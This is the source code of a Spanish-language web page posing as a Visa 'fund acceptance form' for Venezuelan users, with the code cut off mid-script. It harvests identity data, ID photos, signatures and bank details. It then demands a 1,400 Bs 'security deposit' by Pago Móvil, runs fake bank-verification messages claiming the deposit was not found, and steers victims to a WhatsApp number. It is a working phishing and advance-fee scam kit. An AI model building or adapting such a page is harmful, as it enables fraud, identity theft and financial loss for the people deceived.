<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Planilla de Aceptación de Fondos</title>

  <style>
    /****************************************************
     * Variables de estilo
     ****************************************************/
    :root {
      --primary: #1434CB;
      --secondary: #1A1F71;
      --accent: #F7B600;
      --text: #2C2C2C;
      --text-light: #666666;
      --bg: #F4F7FF;
      --input-bg: #FFFFFF;
      --border: #E8ECF4;
      --error: #D22B2B;
      --success: #00A976;
      --gradient: linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
    }

    /****************************************************
     * Reset y fuentes
     ****************************************************/
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Roboto', 'Open Sans', 'Avenir Next', 'Proxima Nova', sans-serif;
      -webkit-font-smoothing: antialiased;
    }

    html, body {
      height: 100%;
      background: var(--bg);
    }

    body {
      color: var(--text);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 2rem;
      position: relative;
    }

    /****************************************************
     * Contenedor principal
     ****************************************************/
    .container {
      width: 100%;
      max-width: 1200px;
      display: flex;
      background: var(--input-bg);
      border-radius: 40px;
      box-shadow: 0 32px 64px -16px rgba(20, 52, 203, 0.15);
      overflow: hidden;
    }

    /****************************************************
     * Barra lateral
     ****************************************************/
    .sidebar {
      flex: 0 0 350px;
      background: var(--gradient);
      padding: 3rem 2rem;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      position: relative;
    }

    .sidebar::after {
      content: '';
      position: absolute;
      top: 0; right: 0; bottom: 0; left: 0;
      background: url('https://via.placeholder.com/400x800') center/cover no-repeat;
      opacity: 0.07;
      mix-blend-mode: soft-light;
      z-index: 0;
    }

    .logo {
      margin-bottom: 2rem;
      text-align: center;
      position: relative;
      z-index: 1;
    }

    .logo img {
      width: 160px;
      height: auto;
      object-fit: contain;
    }

    .sidebar-text {
      position: relative;
      z-index: 1;
      margin-top: 1rem;
      font-size: 0.95rem;
      line-height: 1.6;
      opacity: 0.9;
      text-align: center;
    }

    .steps {
      list-style: none;
      margin-top: 2.5rem;
      position: relative;
      z-index: 1;
      width: 100%;
      padding: 0 1rem;
    }

    .step-item {
      display: flex;
      align-items: flex-start;
      margin-bottom: 1.5rem;
      opacity: 0.6;
      transition: all 0.4s;
    }

    .step-item.active {
      opacity: 1;
    }

    .step-number {
      width: 28px;
      height: 28px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(8px);
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 0.75rem;
      font-weight: 600;
      font-size: 0.85rem;
    }

    .active .step-number {
      background: var(--accent);
      color: var(--secondary);
    }

    .step-title {
      font-weight: 700;
      font-size: 1rem;
      margin-bottom: 0.25rem;
    }

    .step-description {
      font-size: 0.85rem;
      opacity: 0.8;
    }

    /****************************************************
     * Contenido principal
     ****************************************************/
    .main-content {
      flex: 1;
      padding: 3rem;
      display: flex;
      flex-direction: column;
      position: relative;
    }

    .form-header {
      margin-bottom: 2rem;
      text-align: center;
    }

    .form-header h1 {
      font-size: 1.8rem;
      font-weight: 700;
      margin-bottom: 0.5rem;
      background: var(--gradient);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .form-header p {
      color: var(--text-light);
      font-size: 0.95rem;
      line-height: 1.4;
    }

    /****************************************************
     * Ocultar y mostrar pasos
     ****************************************************/
    .form-step {
      display: none;
    }

    .form-step.active {
      display: block;
    }

    /****************************************************
     * Grupos de formulario
     ****************************************************/
    .form-group {
      margin-bottom: 1.5rem;
    }

    label {
      display: block;
      font-weight: 700;
      margin-bottom: 0.5rem;
      font-size: 1rem;
      color: var(--text);
    }

    input, select {
      width: 100%;
      padding: 0.75rem 1rem;
      border: 2px solid var(--border);
      border-radius: 16px;
      font-size: 0.95rem;
      background: var(--input-bg);
      transition: all 0.3s;
      color: var(--text);
      autocomplete: off; /* Para que no guarde datos */
    }

    input:focus, select:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(20, 52, 203, 0.1);
    }

    .btn {
      background: var(--gradient);
      color: white;
      padding: 0.9rem 2rem;
      border: none;
      border-radius: 16px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
    }

    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 16px -4px rgba(20, 52, 203, 0.25);
    }

    .btn-row {
      display: flex;
      gap: 1rem;
      margin-top: 1rem;
    }

    /****************************************************
     * File Upload
     ****************************************************/
    .file-upload {
      border: 2px dashed var(--border);
      border-radius: 16px;
      padding: 2rem;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s;
      background: var(--bg);
      color: var(--text-light);
      font-size: 0.95rem;
    }

    .file-upload:hover {
      border-color: var(--primary);
      background: rgba(20, 52, 203, 0.03);
    }

    .hidden {
      display: none;
    }

    .file-name-preview {
      font-size: 0.85rem;
      color: var(--text);
      margin-top: 0.5rem;
      text-align: center;
    }

    /****************************************************
     * Barra de progreso (más gruesa)
     ****************************************************/
    .progress-indicator {
      position: fixed;
      top: 0; left: 0; right: 0;
      height: 8px; /* más gruesa */
      background: var(--border);
      z-index: 999;
    }
    .progress-bar {
      height: 100%;
      background: var(--gradient);
      width: 0%;
      transition: width 0.6s cubic-bezier(0.16, 1, 0.3, 1);
    }

    /****************************************************
     * Ajustes responsive
     * => Disposición en móviles
     ****************************************************/
    @media (max-width: 980px) {
      .container {
        flex-direction: column;
        border-radius: 0; /* O dejarlo si se desea */
      }
      .sidebar {
        width: 100%;
        flex: initial;
        border-radius: 0;
        display: flex;
        flex-direction: column;
        align-items: center;
        text-align: center;
        padding: 2rem 1rem;
      }
      .steps {
        margin-top: 1rem;
        padding: 0;
      }
      .step-item {
        margin-bottom: 1rem;
      }
      .main-content {
        padding: 2rem 1rem;
      }
    }

    /****************************************************
     * Botón flotante de WhatsApp
     ****************************************************/
    .whatsapp-float {
      position: fixed;
      bottom: 20px;
      right: 20px;
      z-index: 99999;
      display: flex;
      align-items: center;
      gap: 0.4rem;
      background: #25D366;
      color: #fff;
      padding: 0.7rem 1rem;
      border-radius: 30px;
      text-decoration: none;
      font-size: 0.9rem;
      box-shadow: 0 8px 16px -4px rgba(0, 0, 0, 0.3);
    }
    .whatsapp-float img {
      width: 24px;
      height: 24px;
    }
    .whatsapp-float:hover {
      background: #1ebe5a;
      text-decoration: none;
      color: #fff;
    }

    /****************************************************
     * Modales genéricos - Fondo difuminado
     ****************************************************/
    .modal-overlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.3);
      backdrop-filter: blur(6px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .modal {
      background: #fff;
      max-width: 600px;
      width: 90%;
      padding: 2rem;
      border-radius: 20px;
      position: relative;
      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
      animation: fadeInUp 0.4s ease;
    }

    @keyframes fadeInUp {
      from { transform: translateY(30px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    .close-modal {
      background: none;
      border: none;
      font-size: 1.2rem;
      position: absolute;
      top: 1rem; right: 1rem;
      cursor: pointer;
    }

    .modal-header h2 {
      margin-bottom: 1rem;
      font-weight: 700;
      font-size: 1.3rem;
    }

    .modal-content {
      line-height: 1.6;
      font-size: 1rem;
      text-align: justify;
    }

    /****************************************************
     * Modal de firma
     ****************************************************/
    #signatureModal .modal-content {
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    #signatureCanvas {
      border: 2px dashed var(--border);
      border-radius: 8px;
      cursor: crosshair;
    }

    /****************************************************
     * Vista previa de firma
     ****************************************************/
    .signature-preview {
      margin-top: 1rem;
      text-align: center;
    }
    .signature-preview img {
      max-width: 250px;
      border: 2px dashed var(--border);
      border-radius: 8px;
      padding: 0.5rem;
    }

    /****************************************************
     * Loading Overlay
     ****************************************************/
    .loading-overlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(5px);
      z-index: 10000;
      flex-direction: column;
      text-align: center;
    }

    .loading-box {
      background: #fff;
      padding: 2rem;
      border-radius: 20px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
      animation: fadeInUp 0.4s ease;
    }

    .loading-spinner {
      width: 50px;
      height: 50px;
      border: 5px solid var(--border);
      border-top: 5px solid var(--primary);
      border-radius: 50%;
      margin: 0 auto;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      100% { transform: rotate(360deg); }
    }

    .loading-step {
      font-size: 1rem;
      margin: 1rem 0;
      display: none; 
      text-align: center;
    }

    /****************************************************
     * Tarjetas de verificación
     ****************************************************/
    .verification-cards {
      display: flex;
      gap: 1rem;
      margin-bottom: 1.5rem;
      flex-wrap: wrap;
    }

    .verification-card {
      flex: 1 1 220px;
      background: #ffffff;
      border: 2px dashed var(--border);
      border-radius: 12px;
      padding: 1rem;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      min-width: 200px;
    }

    .verification-card h4 {
      margin-bottom: 0.5rem;
      font-weight: 700;
      font-size: 1rem;
    }

    .verification-card ul {
      list-style: disc;
      padding-left: 1.5rem;
      line-height: 1.5;
      font-size: 0.9rem;
    }

    /****************************************************
     * Mensaje flotante Comprobante
     ****************************************************/
    #comprobanteCierreMsg {
      position: fixed;
      bottom: 120px;
      right: 20px;
      background: var(--accent);
      color: var(--secondary);
      padding: 1rem 1.5rem;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
      display: none;
      max-width: 300px;
      font-size: 0.9rem;
      z-index: 999999; 
    }
  </style>
</head>
<body>
  <!-- Barra de progreso -->
  <div class="progress-indicator">
    <div class="progress-bar" id="progressBar"></div>
  </div>

  <!-- Botón flotante de WhatsApp (para todo el proceso) -->
  <a 
    href="https://wa.me/17373018059" 
    target="_blank" 
    class="whatsapp-float" 
    id="waFloat"
    title="Atención al cliente vía WhatsApp"
    style="display:none;"
  >
    <img 
      src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" 
      alt="WhatsApp" 
    />
    <span>Atención al Cliente</span>
  </a>

  <!-- Mensaje flotante que aparece cuando se adjunta el comprobante -->
  <div id="comprobanteCierreMsg">
    Tu comprobante ha sido adjuntado correctamente.<br/>
    En 7 segundos se cerrará este mensaje.
  </div>

  <!-- Modal de validación de datos (5s) -->
  <div class="loading-overlay" id="validationOverlay">
    <div class="loading-box" style="text-align:center;">
      <div class="loading-spinner"></div>
      <p style="margin-top:1rem;">Se están validando tus datos...</p>
    </div>
  </div>

  <!-- Modal de confirmación (Steps) -->
  <div class="modal-overlay" id="modalConfirm">
    <div class="modal">
      <button class="close-modal" onclick="onEditData()">&times;</button>
      <div class="modal-header">
        <h2>Revisar y Confirmar</h2>
      </div>
      <div class="modal-content" id="modalConfirmContent">
        <!-- Contenido dinámico -->
      </div>
      <div class="modal-footer" style="margin-top:1.5rem; display:flex; justify-content:center; gap:1rem;">
        <button class="btn" type="button" onclick="onEditData()">Editar</button>
        <button class="btn" id="btnModalConfirmOk" style="background: var(--accent); color: var(--secondary);">
          Aceptar
        </button>
      </div>
    </div>
  </div>

  <!-- Modal de firma (Step1) -->
  <div class="modal-overlay" id="signatureModal">
    <div class="modal">
      <button class="close-modal" onclick="closeSignatureModal()">&times;</button>
      <div class="modal-header">
        <h2>Firma (como está en tu documento de identidad)</h2>
      </div>
      <div class="modal-content">
        <canvas id="signatureCanvas" width="500" height="200"></canvas>
        <div class="btn-row" style="margin-top:1rem;">
          <button class="btn" type="button" id="clearSignature">Borrar</button>
          <button class="btn" type="button" id="saveSignature">Guardar</button>
        </div>
      </div>
    </div>
  </div>

  <!-- Modal de Loading final (35s) -->
  <div class="loading-overlay" id="finalLoadingOverlay">
    <div class="loading-box">
      <div class="loading-spinner"></div>
      <!-- 8 mensajes de ~5s c/u => ~40s. Ajustamos a 35s aprox -->
      <div class="loading-step" id="finalStep1">Estamos validando todos tus datos...</div>
      <div class="loading-step" id="finalStep2">Estamos conectando con tu banco...</div>
      <div class="loading-step" id="finalStep3">Estamos validando tu recarga de seguridad por 1.400,00 Bolívares...</div>
      <div class="loading-step" id="finalStep4">Estamos preparando tu depósito...</div>
      <div class="loading-step" id="finalStep5">Estamos verificando tu depósito de 1.400,00 Bolívares...</div>
      <div class="loading-step" id="finalStep6">No encontramos tu depósito de seguridad por 1.400,00 Bolívares...</div>
      <div class="loading-step" id="finalStep7">Estamos verificando nuevamente tu recarga por 1.400,00 Bolívares...</div>
      <div class="loading-step" id="finalStep8">
        No encontramos tu depósito de seguridad por 1.400,00 Bolívares.<br/><br/>
        Debes comunicarte con Atención al Cliente ya que no hemos encontrado tu depósito de seguridad 
        y verificación de tu cuenta.
        <div style="margin-top:1rem;">
          <button class="btn" type="button" onclick="openWhatsAppError()">Contactar por WhatsApp</button>
        </div>
      </div>
    </div>
  </div>

  <div class="container">
    <!-- SIDEBAR (pasos) -->
    <aside class="sidebar">
      <div class="logo">
        <!-- Mantener el logo VISA, sin sacrificarlo -->
        <img 
          src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" 
          alt="Visa Logo" 
          title="Visa"
        />
      </div>

      <p class="sidebar-text">
        Planilla de aceptación de fondos.<br/>
        Cumplimos las normativas del Banco Central de Venezuela.
      </p>

      <ul class="steps">
        <li class="step-item active" id="sidebarStep1">
          <div class="step-number">1</div>
          <div>
            <div class="step-title">Datos Personales</div>
            <div class="step-description">Información básica</div>
          </div>
        </li>
        <li class="step-item" id="sidebarStep2">
          <div class="step-number">2</div>
          <div>
            <div class="step-title">Datos Bancarios</div>
            <div class="step-description">Método y depósito</div>
          </div>
        </li>
        <li class="step-item" id="sidebarStep3">
          <div class="step-number">3</div>
          <div>
            <div class="step-title">Verificación</div>
            <div class="step-description">Recarga y confirmación</div>
          </div>
        </li>
      </ul>
    </aside>

    <!-- MAIN CONTENT (Formulario) -->
    <main class="main-content">
      <div class="form-header">
        <h1>Planilla de Aceptación de Fondos</h1>
        <p>
          Confirma tus datos donde depositaremos tus fondos, este paso es por seguridad bancaria, 
          cumpliendo normativas del Banco Central de Venezuela.
        </p>
      </div>

      <form id="masterForm" autocomplete="off">
        <!-- ================= STEP 1: Datos Personales ================= -->
        <div class="form-step active" id="step1">
          <div class="form-group">
            <label for="fullName">Nombres y Apellidos</label>
            <input 
              type="text" 
              id="fullName"
              placeholder="Ej: Juan Pérez" 
              required 
              autocomplete="off"
            />
          </div>

          <!-- Teléfono con prefijo + 7 dígitos -->
          <div class="form-group">
            <label for="phonePrefix">Teléfono</label>
            <div style="display:flex; gap:0.5rem;">
              <!-- Prefijo (4 dígitos) -->
              <select id="phonePrefix" required style="width:30%;" autocomplete="off">
                <option value="">Operadora</option>
                <option value="0412">0412</option>
                <option value="0414">0414</option>
                <option value="0424">0424</option>
                <option value="0416">0416</option>
                <option value="0426">0426</option>
              </select>
              <!-- Número (7 dígitos) -->
              <input 
                type="text" 
                id="phoneNumber" 
                placeholder="1234567" 
                pattern="^\d{7}$" 
                required
                style="width:70%;" 
                autocomplete="off"
              />
            </div>
          </div>

          <div class="form-group">
            <label for="docType">Tipo de Documento</label>
            <select id="docType" required autocomplete="off">
              <option value="">Seleccione</option>
              <option value="Cedula">Cédula</option>
              <option value="Pasaporte">Pasaporte</option>
              <option value="Licencia de Conducir">Licencia de Conducir</option>
            </select>
          </div>

          <div class="form-group">
            <label for="nacionalidad">Nacionalidad</label>
            <select id="nacionalidad" required autocomplete="off">
              <option value="">Seleccione</option>
              <option value="Venezolano">Venezolano</option>
              <option value="Extranjero">Extranjero</option>
            </select>
          </div>

          <!-- Número de Cédula (máximo 8 dígitos, sin letras) -->
          <div class="form-group">
            <label for="cedulaNumber">Número de Cédula</label>
            <input 
              type="text"
              id="cedulaNumber"
              placeholder="Ej: 12345678"
              pattern="^\d{1,8}$"
              required
              autocomplete="off"
            />
          </div>

          <div class="form-group">
            <label for="birthDate">Fecha de Nacimiento</label>
            <input 
              type="date" 
              id="birthDate" 
              required
              autocomplete="off"
            />
          </div>

          <div class="form-group">
            <label>Documento de identidad (vigente y nítido, sólo imágenes)</label>
            <div 
              class="file-upload" 
              onclick="document.getElementById('docUpload').click()"
              id="docUploadTrigger"
            >
              Haz click o toca para seleccionar
            </div>
            <input 
              type="file" 
              id="docUpload" 
              class="hidden"
              accept="image/*"
              required
              autocomplete="off"
            />
            <div class="file-name-preview" id="docUploadName"></div>
          </div>

          <div class="form-group">
            <label>Firma (como está en tu documento de identidad)</label>
            <div 
              class="file-upload"
              style="cursor:pointer;"
              onclick="openSignaturePad()"
            >
              Haz click para firmar
            </div>
            <!-- Aquí se almacena la imagen de la firma en base64 -->
            <input type="hidden" id="signatureData" required />
            <div class="signature-preview" id="signaturePreviewContainer" style="display:none;">
              <strong>Vista Previa:</strong><br/>
              <img id="signaturePreview" src="" alt="Firma Digital" />
            </div>
          </div>

          <div class="btn-row">
            <button type="button" class="btn" onclick="onContinueStep1()">Continuar</button>
          </div>
        </div>

        <!-- ================= STEP 2: Datos Bancarios ================= -->
        <div class="form-step" id="step2">
          <div class="form-group">
            <label for="bankName">Banco</label>
            <select id="bankName" required autocomplete="off">
              <option value="">Seleccione</option>
              <option value="0001|Banco Central de Venezuela">Banco Central de Venezuela</option>
              <option value="0102|Banco de Venezuela S.A.C.A.">Banco de Venezuela S.A.C.A.</option>
              <option value="0104|Banco Venezolano de Crédito S.A.">Banco Venezolano de Crédito S.A.</option>
              <option value="0105|Banco Mercantil, C.A.">Banco Mercantil, C.A.</option>
              <option value="0108|BBVA Provincial, S.A.">BBVA Provincial, S.A.</option>
              <option value="0116|Banco Occidental de Descuento, C.A.">Bco Occidental de Descuento</option>
              <option value="0134|Banesco S.A.C.A.">Banesco S.A.C.A.</option>
              <option value="0137|Banco Sofitasa, C.A.">Banco Sofitasa, C.A.</option>
              <option value="0138|Banco Plaza, C.A.">Banco Plaza, C.A.</option>
              <option value="0146|BFC Banco Fondo Común">BFC Banco Fondo Común</option>
              <option value="0151|BOD Banco Occidental de Descuento">BOD</option>
              <option value="0156|100% Banco">100% Banco</option>
              <option value="0157|DELSUR">DELSUR</option>
              <option value="0163|Banco del Tesoro, C.A.">Banco del Tesoro</option>
              <option value="0166|Banco Agrícola de Venezuela, C.A.">Banco Agrícola de Venezuela</option>
              <option value="0168|Bancrecer">Bancrecer</option>
              <option value="0171|BANPLUS">BANPLUS</option>
              <option value="0172|Banco de la Gente Emprendedora (Bangente)">Bangente</option>
              <option value="0173|Banco Internacional de Desarrollo, C.A.">BID</option>
              <option value="0174|BanEve">BanEve</option>
              <option value="0175|Banco Bicentenario del Pueblo, C.A.">Banco Bicentenario</option>
              <option value="0177|Bancaribe">Bancaribe</option>
              <option value="0191|Bancamiga, C.A.">Bancamiga, C.A.</option>
            </select>
          </div>

          <div class="form-group">
            <label for="accountNumber">Número de Cuenta</label>
            <input
              type="text"
              id="accountNumber"
              placeholder="Ej: 0102xxxxxxxxxxxx"
              maxlength="20"
              required
              autocomplete="off"
            />
          </div>

          <div class="form-group">
            <label for="accountType">Tipo de Cuenta / Moneda</label>
            <select id="accountType" required autocomplete="off">
              <option value="">Seleccione</option>
              <option value="ahorro">Ahorro (Bs)</option>
              <option value="corriente">Corriente (Bs)</option>
              <option value="usd">Divisa USD</option>
              <option value="eur">Divisa EUR</option>
            </select>
          </div>

          <div class="form-group">
            <label for="origenFondos">Origen de los Fondos</label>
            <select id="origenFondos" required autocomplete="off">
              <option value="">Seleccione</option>
              <option value="Ayuda familiar">Ayuda familiar</option>
              <option value="Pago de deudas">Pago de deudas</option>
              <option value="Ahorros">Ahorros</option>
              <option value="Inversiones">Inversiones</option>
              <option value="Pagos de servicios">Pagos de servicios</option>
              <option value="Educación">Educación</option>
              <option value="Ventas">Ventas</option>
              <option value="Compras">Compras</option>
              <option value="Gastos médicos">Gastos médicos</option>
              <option value="Apoyo en emergencias">Apoyo en emergencias</option>
              <option value="Mantenimiento de propiedades">Mantenimiento de propiedades</option>
              <option value="Regalos">Regalos</option>
            </select>
          </div>

          <!-- Eliminamos la opción 500; se queda 1000, 1500, 2000 -->
          <div class="form-group">
            <label for="usdAmount">Cantidad en USD (opcional)</label>
            <select id="usdAmount" autocomplete="off">
              <option value="">Seleccione</option>
              <option value="1000">1000</option>
              <option value="1500">1500</option>
              <option value="2000">2000</option>
            </select>
          </div>

          <div class="form-group">
            <label for="bsAmount">Cantidad en Bolívares</label>
            <input 
              type="text" 
              id="bsAmount" 
              placeholder="Se calculará automáticamente (1 USD = 69 Bs)" 
              readonly
              autocomplete="off"
            />
          </div>

          <div class="form-group">
            <label for="montoAlto">¿Recibe usualmente montos altos?</label>
            <select id="montoAlto" required autocomplete="off">
              <option value="">Seleccione</option>
              <option value="si">Sí</option>
              <option value="no">No</option>
            </select>
          </div>

          <!-- Método de depósito -->
          <div class="form-group">
            <label for="depositante">Nombre del Depositante / Titular de la Tarjeta</label>
            <input 
              type="text" 
              id="depositante" 
              placeholder="Ej: María González" 
              required
              autocomplete="off"
            />
          </div>

          <div class="form-group">
            <label for="comprobante">Número de Comprobante</label>
            <input 
              type="text" 
              id="comprobante" 
              placeholder="Ej: 12345" 
              required
              autocomplete="off"
            />
          </div>

          <div class="form-group">
            <label>Método de Depósito</label>
            <select id="metodoDeposito" required autocomplete="off">
              <option value="">Seleccione</option>
              <option value="pagoMovil">Pago Móvil</option>
              <option value="transferencia">Transferencia Tradicional</option>
            </select>
          </div>

          <!-- Check Términos y Condiciones con enlace a https://www.visa.es/terminos-de-uso.html -->
          <div class="form-group" style="display: flex; align-items: center; gap: 0.5rem;">
            <input type="checkbox" id="acceptTerms" required />
            <label for="acceptTerms" style="margin: 0; cursor: pointer;">
              <a href="https://www.visa.es/terminos-de-uso.html" target="_blank" style="text-decoration:none; color: var(--secondary);">
                Acepto los términos y condiciones
              </a>
            </label>
          </div>

          <div class="btn-row">
            <button type="button" class="btn" onclick="onEditData()">Regresar</button>
            <button type="button" class="btn" onclick="onContinueStep2()">Continuar</button>
          </div>
        </div>

        <!-- ================= STEP 3: Verificación / Recarga ================= -->
        <div class="form-step" id="step3">
          <h2 style="margin-bottom:1rem;">Verificación y Recarga</h2>

          <!-- Texto principal con nombre, banco, etc. -->
          <p id="finalExplanation" style="margin-bottom:1.5rem; text-align:justify;">
            <!-- Texto se completará dinámicamente -->
          </p>

          <!-- Tarjetas: ¿Por qué necesitamos esta verificación? y Beneficios -->
          <div class="verification-cards">
            <div class="verification-card">
              <h4>¿Por qué necesitamos esta verificación?</h4>
              <ul>
                <li>La cuenta bancaria que registraste no ha recibido montos elevados antes.</li>
                <li>El banco exige confirmar que eres el titular real para evitar bloqueos.</li>
                <li>Cumplimos las políticas del Banco Central de Venezuela.</li>
                <li>Prevenimos financiamiento al terrorismo y lavado de dinero.</li>
                <li>Demostramos que tú, y no un tercero, controlas tu cuenta.</li>
              </ul>
            </div>

            <div class="verification-card">
              <h4>Beneficios</h4>
              <ul>
                <li>Evitas bloqueos o retenciones del banco por depósitos inusuales.</li>
                <li>Garantizas la inmediatez de tu depósito total.</li>
                <li>Cuidas tu cuenta cumpliendo normativas legales.</li>
                <li>La recarga de 1.400 Bs se reembolsará.</li>
                <li>No se cobra comisión: el importe no se descuenta de tus fondos.</li>
              </ul>
            </div>
          </div>

          <!-- Banner motivacional -->
          <div style="
            border: 2px dashed var(--border); 
            border-radius:12px; 
            padding:1rem; 
            margin-bottom:1rem; 
            text-align:center;
          ">
            <strong>Estamos preparados para efectuar el depósito de <span id="immediateDeposit"></span> de forma inmediata</strong>
          </div>

          <!-- Datos de recarga -->
          <div style="
            background: #fff; 
            border-radius:12px; 
            padding:1rem; 
            margin-bottom:1rem; 
            box-shadow:0 2px 8px rgba(0,0,0,0.1);
          ">
            <h3 style="margin-bottom:0.5rem;">Datos para tu Recarga de Seguridad (Reembolsable)</h3>
            <ul style="list-style: none; padding-left: 0; line-height:1.6;">
              <li><strong>Sistema:</strong> Pago Móvil</li>
              <li><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</li>
              <li><strong>Teléfono:</strong> 0412-1000000</li>
              <li><strong>RIF:</strong> J-407502646</li>
              <li><strong>Monto de Recarga de Seguridad:</strong> 1.400,00 Bs</li>
              <li><strong>Concepto / Referencia:</strong> Tu número de cédula</li>
            </ul>
          </div>

          <p style="text-align:justify; margin-bottom:1rem;">
            Por favor, adjunta aquí el comprobante (imagen) de tu recarga de 1.400,00 Bs y 
            presiona el botón para <strong>aceptar fondos</strong> en tu cuenta.
          </p>

          <div class="form-group">
            <label>Adjuntar Comprobante de la Recarga</label>
            <div 
              class="file-upload"
              style="cursor:pointer;"
              onclick="document.getElementById('recargaUpload').click()"
            >
              Seleccionar Comprobante
            </div>
            <input 
              type="file" 
              id="recargaUpload" 
              class="hidden"
              accept="image/*"
              autocomplete="off"
            />
            <div class="file-name-preview" id="recargaUploadName"></div>
          </div>

          <div class="btn-row">
            <button type="button" class="btn" onclick="onEditData()">Regresar</button>
            <button type="button" class="btn" onclick="aceptarFondos()">Acepto Fondos en mi cuenta bancaria</button>
          </div>
        </div>
      </form>
    </main>
  </div> <!-- Fin .container -->

  <script>
    /****************************************************
     * Variables
     ****************************************************/
    const steps = document.querySelectorAll('.form-step');
    const sidebarSteps = document.querySelectorAll('.step-item');
    let currentStep = 1;

    const progressBar = document.getElementById('progressBar');

    const validationOverlay = document.getElementById('validationOverlay');
    const modalConfirm = document.getElementById('modalConfirm');
    const modalConfirmContent = document.getElementById('modalConfirmContent');
    const finalLoadingOverlay = document.getElementById('finalLoadingOverlay');
    const comprobanteCierreMsg = document.getElementById('comprobanteCierreMsg');

    let confirmStep = 1;

    document.addEventListener('DOMContentLoaded', () => {
      document.getElementById('waFloat').style.display = 'flex';
    });

    /****************************************************
     * Manejo de Steps
     ****************************************************/
    function showStep(step) {
      steps.forEach((st) => st.classList.remove('active'));
      steps[step - 1].classList.add('active');

      updateProgress(step);
      sidebarSteps.forEach((item, idx) => {
        item.classList.remove('active');
        if (idx < step) item.classList.add('active');
      });
      currentStep = step;
    }

    function updateProgress(step) {
      const total = steps.length;
      progressBar.style.width = ((step - 1) / (total - 1)) * 100 + '%';
    }

    /****************************************************
     * Step1 => Validar => Overlay 5s => Modal
     ****************************************************/
    function onContinueStep1() {
      if (!validateStep1()) return;
      validationOverlay.style.display = 'flex';
      setTimeout(() => {
        validationOverlay.style.display = 'none';
        confirmStep = 1;
        modalConfirmContent.innerHTML = buildSummaryStep1();
        modalConfirm.style.display = 'flex';
      }, 5000);
    }

    /****************************************************
     * Step2 => Validar => Overlay 5s => Modal
     ****************************************************/
    function onContinueStep2() {
      if (!validateStep2()) return;
      validationOverlay.style.display = 'flex';
      setTimeout(() => {
        validationOverlay.style.display = 'none';
        confirmStep = 2;
        modalConfirmContent.innerHTML = buildSummaryStep2();
        modalConfirm.style.display = 'flex';
      }, 5000);
    }

    /****************************************************
     * EDITAR => Borra todo
     ****************************************************/
    function onEditData() {
      modalConfirm.style.display = 'none';
      validationOverlay.style.display = 'none';
      finalLoadingOverlay.style.display = 'none';
      comprobanteCierreMsg.style.display = 'none';
      clearAllData();
      showStep(1);
    }

    /****************************************************
     * Aceptar => Step
     ****************************************************/
    const btnModalConfirmOk = document.getElementById('btnModalConfirmOk');
    btnModalConfirmOk.addEventListener('click', () => {
      modalConfirm.style.display = 'none';
      if (confirmStep === 1) {
        showStep(2);
      } else if (confirmStep === 2) {
        showStep(3);
        fillStep3Explanation();
      }
    });

    /****************************************************
     * Limpiar
     ****************************************************/
    function clearAllData() {
      const masterForm = document.getElementById('masterForm');
      masterForm.reset();
      document.getElementById('docUploadName').textContent = '';
      document.getElementById('recargaUploadName').textContent = '';
      document.getElementById('signaturePreviewContainer').style.display = 'none';
      document.getElementById('signaturePreview').src = '';
      document.getElementById('signatureData').value = '';
      currentStep = 1;
      updateProgress(currentStep);
      steps.forEach((st) => st.classList.remove('active'));
      steps[0].classList.add('active');
      sidebarSteps.forEach((item) => item.classList.remove('active'));
      sidebarSteps[0].classList.add('active');
    }

    /****************************************************
     * Validaciones
     ****************************************************/
    function validateStep1() {
      const fullName = document.getElementById('fullName');
      const phonePrefix = document.getElementById('phonePrefix');
      const phoneNumber = document.getElementById('phoneNumber');
      const docType = document.getElementById('docType');
      const nacionalidad = document.getElementById('nacionalidad');
      const cedulaNumber = document.getElementById('cedulaNumber');
      const birthDate = document.getElementById('birthDate');
      const docUpload = document.getElementById('docUpload');
      const signatureData = document.getElementById('signatureData');

      if (
        !fullName.value.trim() ||
        !phonePrefix.value ||
        !phoneNumber.value.match(/^\d{7}$/) ||
        !docType.value ||
        !nacionalidad.value ||
        !cedulaNumber.value.match(/^\d{1,8}$/) ||
        !birthDate.value ||
        !docUpload.files.length ||
        !signatureData.value
      ) {
        alert('Por favor, completa todos los campos correctamente en Datos Personales.');
        return false;
      }
      return true;
    }

    function validateStep2() {
      const bankName = document.getElementById('bankName');
      const accountNumber = document.getElementById('accountNumber');
      const accountType = document.getElementById('accountType');
      const origenFondos = document.getElementById('origenFondos');
      const montoAlto = document.getElementById('montoAlto');
      const depositante = document.getElementById('depositante');
      const comprobante = document.getElementById('comprobante');
      const metodoDeposito = document.getElementById('metodoDeposito');
      const acceptTerms = document.getElementById('acceptTerms');

      if (
        !bankName.value ||
        !accountNumber.value.trim() ||
        !accountType.value ||
        !origenFondos.value ||
        !montoAlto.value ||
